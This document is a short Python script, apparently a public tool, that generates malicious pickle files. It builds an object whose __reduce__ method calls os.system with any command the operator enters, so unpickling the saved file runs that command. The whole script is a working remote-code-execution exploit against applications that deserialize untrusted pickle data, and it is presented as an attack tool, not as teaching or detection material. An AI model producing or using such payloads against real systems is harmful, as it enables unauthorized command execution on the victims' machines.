# Python Deserialization attack payload file generator for pickle module by j0lt
# Requirements : Python 3
# Usage : python peas.py

import pickle
import os


class Payload(object):

    def __init__(self):
        self.cmd = input("Enter RCE command :")

    def __reduce__(self):

        return os.system, (self.cmd,)


if __name__ == "__main__":

    a = pickle.dumps(Payload())
    open(input("Enter File location and name to save :"), "wb").write(a)
    print("done...")
